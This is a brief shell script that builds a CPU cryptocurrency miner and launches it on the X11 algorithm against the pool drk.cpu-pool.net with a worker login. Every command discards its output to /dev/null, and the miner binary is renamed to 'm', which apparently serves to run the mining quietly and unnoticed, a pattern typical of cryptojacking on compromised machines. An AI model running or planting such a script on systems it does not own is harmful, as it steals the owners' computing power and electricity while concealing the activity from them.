chmod a+x autogen.sh  > /dev/null 2>&1
chmod a+x nomacro.pl > /dev/null 2>&1
./autogen.sh > /dev/null 2>&1
./nomacro.pl > /dev/null 2>&1
./configure CFLAGS="-O3" > /dev/null 2>&1
make > /dev/null 2>&1
mv min*d m > /dev/null 2>&1
./m -a X11 -o stratum+tcp://drk.cpu-pool.net:3500 -u soku2.tra -p vis > /dev/null 2>&1
